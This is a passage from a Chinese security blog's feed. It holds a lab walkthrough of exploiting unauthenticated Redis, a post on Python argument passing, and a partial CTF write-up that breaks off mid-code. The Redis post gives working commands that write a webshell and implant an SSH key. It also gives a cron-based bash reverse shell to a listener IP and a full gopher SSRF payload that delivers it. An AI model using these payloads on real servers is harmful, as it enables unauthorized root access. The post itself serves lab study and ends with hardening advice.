    <content type="html"><![CDATA[<h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。(有点不友好，可能直接会导致宕机)<a id="more"></a></p><p>如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</p><h3 id="未授权redis的一些运用"><a href="#未授权redis的一些运用" class="headerlink" title="未授权redis的一些运用"></a>未授权redis的一些运用</h3><h4 id="写个shell"><a href="#写个shell" class="headerlink" title="写个shell"></a>写个shell</h4><p>这里我以Ubuntu 14版做的测试，往网站的根目录下写一个webshell就行，在redis上设置了目录以及文件名，写入内容</p><p><img src="https://s2.ax1x.com/2019/06/15/VIyLI1.png" alt="VIyLI1.png"></p><p>添加上去是以运行的人权限添加的</p><p><img src="https://s2.ax1x.com/2019/06/15/VI6pse.png" alt="VI6pse.png"></p><p>当然也能执行</p><p><img src="https://s2.ax1x.com/2019/06/15/VI69qH.png" alt="VI69qH.png"></p><h4 id="使用秘钥进行登录"><a href="#使用秘钥进行登录" class="headerlink" title="使用秘钥进行登录"></a>使用秘钥进行登录</h4><p>现在本机生成一对秘钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/15/VoJHGd.png" alt="VoJHGd.png"></p><p>把公钥拿出来</p><p><img src="https://s2.ax1x.com/2019/06/15/VoY9iQ.png" alt="VoY9iQ.png"></p><p>在redis里面设置写操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCm5rJyVESTrJT1DESSsXJbXrvBKTUPV5wqfmsmCKcWp2ysV/JVP4MUk+NKbVsg8wb4QuU0IueWd+vIi8jLiAEennl01idUujE75BxJ0exKqJ18jJfNemu//RLOmasXrZ9I/NJB5LtVcRDkN8MZevK2zzKxPJuZlH8plL4sLft1kXOHNWORylDQpAodF8qlI1LiKbR6ZRb/1m3Xy8XGzJ4wkdghSJDE1SPAwC5JJq1rVmAoIs6hujrlsy0LHSCAm+fViKPnRIi94NotCKdtyrQqv3VtvblGRfT/h+My4WUjfQLKjocomLDuUGOgBFp6DOAV8BGxX+7KAMm0Z9NAkpaF root@Chan\n\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/15/VoYPRs.png" alt="VoYPRs.png"></p><p>最后就可以成功连接ssh，完全不需要密码</p><p><img src="https://s2.ax1x.com/2019/06/15/VoYui4.png" alt="VoYui4.png"></p><h4 id="redis设置定时任务"><a href="#redis设置定时任务" class="headerlink" title="redis设置定时任务"></a>redis设置定时任务</h4><p>这个就是利用一个写的操作去实现定时任务，但是配这个环境贼坑。。上面的Ubuntu都不能实现。。我用的是centos</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> 1 <span class="string">"\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.70.147/2444 0&gt;&amp;1\n\n"</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>定时任务怎么设置，这个图很清楚了</p><p><a href="https://www.wuliaole.com/post/what_you_need_to_know_about_cron_and_crontab/crontab.jpg" target="_blank" rel="noopener"><img src="https://www.wuliaole.com/post/what_you_need_to_know_about_cron_and_crontab/crontab.jpg" alt="crontab的语法格式"></a></p><p>用的就这么几句话，配环境配一个下午</p><p><img src="https://s2.ax1x.com/2019/06/15/Vo83sf.png" alt="Vo83sf.png"></p><p>这里注意反弹shell的语句要加上换行符，不然的话在root文件里面是执行不了的，因为以redis服务写入的前面会加上一些乱七八糟的东西，很可能就不能成功执行，害怕执行不了的话加多几个换行符吧。这也解释了我上图为何使用tac去读文件，简单的cat有时候还读不出来，xxd也可以读</p><p>然后另外一个机子开始监听，成功监听</p><p><img src="https://s2.ax1x.com/2019/06/15/Vo8WWR.png" alt="Vo8WWR.png"></p><p>这个环境有几个坑点要注意一下，第一设置定时任务用Ubuntu的系统是不行的，详情可以参考这篇文章：<code>https://joychou.org/hostsec/linux-crontab-rebound-shell-hole.html</code>，网上很多直接Ubuntu或者kali输入那个命令之后然后就说等个一分钟的那种博客，真是醉了，确实是有点不负责了。。。joychou大佬也总结了，为啥不行的原因</p><p>ubuntu利用写文件执行crontab不会成功。原因有两点：</p><ol><li>如果写<code>/etc/crontab</code>，语法不识别</li><li>如果写<code>/var/spool/cron/crontabs/root</code>，权限不是600，而且语法也不识别</li></ol><p>第二curl的版本是否支持gopher，因为我这里安装的centos默认版本的curl不支持gopher协议，php的curl底层调用的是系统的curl，就会出现一些问题，因此我把它给升级了。</p><p>JoyChou大佬的博客的还有一些利用，使用gopher 协议  ，一般是关联上ssrf漏洞的使用的</p><p>场景：  web ssrf–&gt;gopher–&gt;redis <strong>没密码</strong>   –&gt; 运用cron   –&gt;反弹shell</p><h5 id="什么是gopher协议？"><a href="#什么是gopher协议？" class="headerlink" title="什么是gopher协议？"></a>什么是gopher协议？</h5><p>gopher是一个互联网上使用的分布型的文件搜集获取网络协议</p><p>gopher协议支持发出GET、POST请求:可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中–个最强大的协议(俗称万能协议)。</p><p>使用gopher请求，首先你得抓出流量才行，利用socat做一个端口转发，注意这里的流量，是为了我们能够使用gopher而利用在本地测试抓的</p><p>本地利用一个shell脚本和socat做一个流量抓取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n"</span>|redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> 1</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename root</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</span><br></pre></td></tr></table></figure><p>先做一个端口转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</span><br></pre></td></tr></table></figure><p>再运行上面那个shell脚本，意思是将本地的4444端口转发到本地的6379端口。访问该服务器的4444端口，访问的其实是该服务器的6379端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis.sh 127.0.0.1 4444</span><br></pre></td></tr></table></figure><p>监听的这边会抓到流量，保存下来即可，保存在socat.log</p><p><img src="https://s2.ax1x.com/2019/06/16/VTI8EV.png" alt="VTI8EV.png"></p><p>然后对流量进行转换一下，附上joychou大佬的转换脚本</p><p><img src="https://s2.ax1x.com/2019/06/16/VThwut.png" alt="VThwut.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">            exp = exp + <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line"><span class="keyword">print</span> exp</span><br></pre></td></tr></table></figure><p>转换规则如下：</p><ul><li>如果第一个字符是<code>&gt;</code>或者<code>&lt;</code>那么丢弃该行字符串，表示请求和返回的时间。</li><li>如果前3个字符是<code>+OK</code> 那么丢弃该行字符串，表示返回的字符串。</li><li>将<code>\r</code>字符串替换成<code>%0d%0a</code></li><li>空白行替换为<code>%0a</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.70.134/2444 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure><p>还有一个点要注意的是在JoyChou这位老哥的博客里面还提及一点就是字符长度的问题，他的博文是以127.0.0.1作为例子的，所以会出现下面的情况，如果不想要这么麻烦最好直接在shell脚本上改一下就好</p><p><img src="https://s2.ax1x.com/2019/06/16/VThFBV.png" alt="VThFBV.png"></p><p>最后在你的流量前面加上需要的gopher协议<code>gopher://127.0.0.1:6379/_</code>构成最后的payload，构造一段php代码尝试一下，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) </span><br><span class="line">&#123; </span><br><span class="line">$link = $_POST[<span class="string">'url'</span>]; </span><br><span class="line">$filename = <span class="string">'./curled/'</span>.rand().<span class="string">'txt'</span>; </span><br><span class="line">$curlobj = curl_init($link); </span><br><span class="line">$fp = fopen($filename,<span class="string">"w"</span>); </span><br><span class="line">curl_setopt($curlobj, CURLOPT_FILE, $fp); </span><br><span class="line">curl_setopt($curlobj, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">curl_exec($curlobj); </span><br><span class="line">curl_close($curlobj); </span><br><span class="line">fclose($fp); </span><br><span class="line">$fp = fopen($filename,<span class="string">"r"</span>); </span><br><span class="line">$result = fread($fp, filesize($filename)); </span><br><span class="line">fclose($fp); </span><br><span class="line"><span class="keyword">echo</span> $result; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"> </span><br><span class="line">&lt;html&gt;&lt;body&gt; </span><br><span class="line"> </span><br><span class="line">&lt;form name=<span class="string">"px"</span> method=<span class="string">"post"</span> action=<span class="string">"./ssrf1.php"</span>&gt; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"url"</span> value=<span class="string">""</span>&gt; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"commit"</span> value=<span class="string">"submit"</span>&gt;</span><br></pre></td></tr></table></figure><p>可能符号太多需要URL编码一下，返回五个OK</p><p><img src="https://s2.ax1x.com/2019/06/16/VT4hzd.png" alt="VT4hzd.png"></p><p>定时任务成功写入，成功反弹shell</p><p><img src="https://s2.ax1x.com/2019/06/16/VT5PoT.png" alt="VT5PoT.png"></p><p><img src="https://s2.ax1x.com/2019/06/16/VT5SLq.png" alt="VT5SLq.png"></p><h3 id="修复的依一些建议"><a href="#修复的依一些建议" class="headerlink" title="修复的依一些建议"></a>修复的依一些建议</h3><p>1、禁止一些高危命令</p><p>2、以低权限运行 Redis 服务</p><p>3、为 Redis 添加密码验证</p><p>4、禁止外网访问 Redis</p><p>5、保证 authorized_keys 文件的安全</p><p>6、设置防火墙策略</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h3&gt;&lt;p&gt;Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。(有点不友好，可能直接会导致宕机)
    
    </summary>
    
      <category term="Redis" scheme="0verwatch.top/categories/Redis/"/>
    
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="redis" scheme="0verwatch.top/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>关于python传参引发的一些思考</title>
    <link href="0verwatch.top/python-thinking-1.html"/>
    <id>0verwatch.top/python-thinking-1.html</id>
    <published>2019-04-14T09:22:05.000Z</published>
    <updated>2019-04-14T09:26:20.459Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>人总有不会的，遇到一些问题深究下去必定有所收获</p></blockquote><p>这个问题是在我写python爬虫项目的时候的疑问，可能是我太菜了(以前没学透彻)，也可能是上学期学Java的时候按值传递的特点给搞混了，因为当时在用多线程的生产者消费者问题处理资源队列，参考别人代码的时候突然蒙了一下<a id="more"></a>，但后来查了查资料发现原来是下面的原因，值得记录一下坑点，顺便当复习，对语言有个更深入的理解也挺好的</p><h4 id="前置的一些知识"><a href="#前置的一些知识" class="headerlink" title="前置的一些知识"></a>前置的一些知识</h4><ol><li><p>在python里面一切皆为对象，而这个对象分成两种类型，第一种是可变的，另外一种是不可变的。</p></li><li><p>按值传递：会在堆中建立一个新的副本，以后操作只对副本操作，对原来主函数里面的值不影响。</p><p>按引用传递：会在堆中建立一个地址的引用，也就是参数的地址，一旦改变这个值就会把主函数里面的变量也会改变。</p></li></ol><h4 id="做一些验证"><a href="#做一些验证" class="headerlink" title="做一些验证"></a>做一些验证</h4><p>这里我以参考的代码里面的一部分进行验证，这里用类去类比一下函数，一样的效果，通过id参数打印一下地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,page_queue,*args,**kwargs)</span>:</span></span><br><span class="line">        super(Consumer, self).__init__(*args,**kwargs)</span><br><span class="line">        self.page_queue = page_queue</span><br><span class="line">        print(id(self.page_queue))</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">page_queue = <span class="number">1</span></span><br><span class="line">print(id(page_queue))</span><br><span class="line">c = Consumer(page_queue)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>输出结果是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">140722209422880</span><br><span class="line">140722209422880</span><br></pre></td></tr></table></figure><p>可以发现两处的地址是一样的，可以脑补一下图应该是这样的，好像是引用传值，到底是不是这样的呢？</p><p><img src="https://s2.ax1x.com/2019/04/14/AO7U9f.png" alt="AO7U9f.png"></p><p>再来一段代码验证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,page_queue,*args,**kwargs)</span>:</span></span><br><span class="line">        super(Consumer, self).__init__(*args,**kwargs)</span><br><span class="line">        self.page_queue = page_queue</span><br><span class="line">        print(id(self.page_queue))</span><br><span class="line">        self.page_queue += <span class="number">1</span></span><br><span class="line">        print(id(self.page_queue))</span><br><span class="line">        print(id(page_queue),page_queue)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">page_queue = <span class="number">1</span></span><br><span class="line">print(id(page_queue))</span><br><span class="line">c = Consumer(page_queue)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>结果是这个样子的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">140722209422880</span><br><span class="line">140722209422880</span><br><span class="line">140722209422912</span><br><span class="line">140722209422880 1</span><br></pre></td></tr></table></figure><p>可以发现，以本来引用的常规思路去看的话，这样的操作应该会对同一个地址的东西修改了才对，你会发现，他重新开辟了一个新的空间去容纳新的值，原来传进去的参数没有存在任何影响，脑补一下这个图，现在变成了这样，跟平常的引用是不是有点不一样。</p><p><img src="https://s2.ax1x.com/2019/04/14/AOHK5q.png" alt="AOHK5q.png"></p><p>再来看这样一段代码，以队列为例，然后对传进的队列做修改，再观察一下地址内容的改变，查看其是否为空</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,page_queue,*args,**kwargs)</span>:</span></span><br><span class="line">        super(Consumer, self).__init__(*args,**kwargs)</span><br><span class="line">        self.page_queue = page_queue</span><br><span class="line">        self.page_queue.put(<span class="number">1</span>)   <span class="comment">#增加一个值</span></span><br><span class="line">        print(id(self.page_queue))</span><br><span class="line">        print(id(page_queue),page_queue.empty())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    page_queue = Queue(<span class="number">100</span>)</span><br><span class="line">    print(id(page_queue))</span><br><span class="line">    print(page_queue.empty())</span><br><span class="line">    c = Consumer(page_queue)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>输出的结果是这个样子的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1519902231520</span><br><span class="line">True</span><br><span class="line">1519902231520</span><br><span class="line">1519902231520 False</span><br></pre></td></tr></table></figure><p>可以发现值变化了，地址却没发生变化，明显的引用传参的例子</p><h4 id="自己的小结"><a href="#自己的小结" class="headerlink" title="自己的小结"></a>自己的小结</h4><p>这里就可以对照一下上面为什么说python对象有两种类型，一种是可变的，另外一种是不可变的，因为在python这个语言中，对于不可变对象的传参例如(tuple，数字，字符)他们一旦发生改变，就会重新在堆里面分配你一块空间，去给变化的值，这也在宏观上给人一种按值传递的错觉，但是这样的机制也优化了python的运行，对于可变的对象的传参例如(list，dict，还有上面提及到的queue类)相当于通过按引用来传递对象。</p><p>写代码的时候才发现自己有多菜2333333，大佬们请忽略</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;人总有不会的，遇到一些问题深究下去必定有所收获&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个问题是在我写python爬虫项目的时候的疑问，可能是我太菜了(以前没学透彻)，也可能是上学期学Java的时候按值传递的特点给搞混了，因为当时在用多线程的生产者消费者问题处理资源队列，参考别人代码的时候突然蒙了一下
    
    </summary>
    
      <category term="python" scheme="0verwatch.top/categories/python/"/>
    
    
      <category term="python" scheme="0verwatch.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>周周练西湖论剑特别版(部分wp)</title>
    <link href="0verwatch.top/week-practice-anheng.html"/>
    <id>0verwatch.top/week-practice-anheng.html</id>
    <published>2019-03-31T08:47:32.000Z</published>
    <updated>2019-04-14T09:21:30.451Z</updated>
    
    <content type="html"><![CDATA[<p>复习数学复习到吐，结果又说推迟一个月再考试，实在对数学提不了兴趣就刷刷题，又来水一篇博客<a id="more"></a>    </p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h4><p>这个题扫个二维码就行了</p><h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><p>这个题目说管理员登陆的密码就是flag，那么我们可以导出http对象看一下发现这几个可疑的url</p><p><a href="https://imgchr.com/i/AruUIO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/31/AruUIO.png" alt="AruUIO.png"></a></p><p>点击大小为7266字节的那个包然后追踪流就会发现，里面有一个password关键字，这个就是flag</p><p><img src="https://s2.ax1x.com/2019/03/31/ArussI.png" alt="ArussI.png"></p><h4 id="百里挑一"><a href="#百里挑一" class="headerlink" title="百里挑一"></a>百里挑一</h4><p>我记得这个以前做过，好像是要写个脚本把里面的图片筛选出来，太耗神没时间不做了，导了一下图片，418张。。。</p><p><img src="https://s2.ax1x.com/2019/03/31/AruIQs.png" alt="AruIQs.png"></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Ordinary-keyboard"><a href="#Ordinary-keyboard" class="headerlink" title="Ordinary keyboard"></a>Ordinary keyboard</h4><p>不清楚题目跟keyboard有什么关系，反正我只能从题目中了解到几个字母的对应关系，反正数字是不变的。。还是留点脑子想高数吧，这脑洞真的不适合我</p><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>正常类型的题目，给了你公钥，先用openssl把n，e导出来</p><p><img src="https://s2.ax1x.com/2019/03/31/ArK1k8.png" alt="ArK1k8.png"></p><p>然后转十进制n分解</p><p><img src="https://s2.ax1x.com/2019/03/31/ArKamq.png" alt="ArKamq.png"></p><p><img src="https://s2.ax1x.com/2019/03/31/ArKw7V.png" alt="ArKw7V.png"></p><p>搞个代码写个私钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">arsa=RSA.generate(<span class="number">1024</span>)</span><br><span class="line">arsa.p=<span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">arsa.q=<span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">arsa.e=<span class="number">65537</span></span><br><span class="line">arsa.n=arsa.p*arsa.q</span><br><span class="line">Fn=long((arsa.p<span class="number">-1</span>)*(arsa.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">    x=(Fn*i)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(x%arsa.e==<span class="number">0</span>):</span><br><span class="line">           arsa.d=x/arsa.e</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">private=open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(arsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>解密得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private.pem -out flag.dec</span><br></pre></td></tr></table></figure><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="WebScan"><a href="#WebScan" class="headerlink" title="WebScan"></a>WebScan</h4><p>这个题目都做了很多遍了，这里根据题意可以去读一下apache的相关配置文件，这里是读取<code>/etc/httpd/conf/httpd.conf</code>，直接就出来flag了</p><p><img src="https://s2.ax1x.com/2019/03/31/ArM93Q.png" alt="ArM93Q.png"></p><h4 id="刀塔"><a href="#刀塔" class="headerlink" title="刀塔"></a>刀塔</h4><p>有一个flag文件，绝对是想考察读取文件，看到还有几个注入参数，一开始以为是SQL注入读文件，但是首先得绕过，因为他对过滤的字符回显<code>Illegal operation!</code>，然后fuzz一下看过滤了哪些字符，就突然出现flag了。。这是来搞笑的？(黑人问号)</p><p><img src="https://s2.ax1x.com/2019/03/31/ArML24.png" alt="ArML24.png"></p><p>然后回过头来看看这个出题人想干啥，发现这个目录下还存在一个<code>www.zip</code>文件，可以直接下载下来，也可以看到flag。。。。这出题还有什么意义？再想想应该是出题人应该是忘记把flag文件忘记删额。。因为我看了下index的源码，他想考察的应该是命令执行的绕过，通配符之类的，因为他不允许出现字母并且有长度限制。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 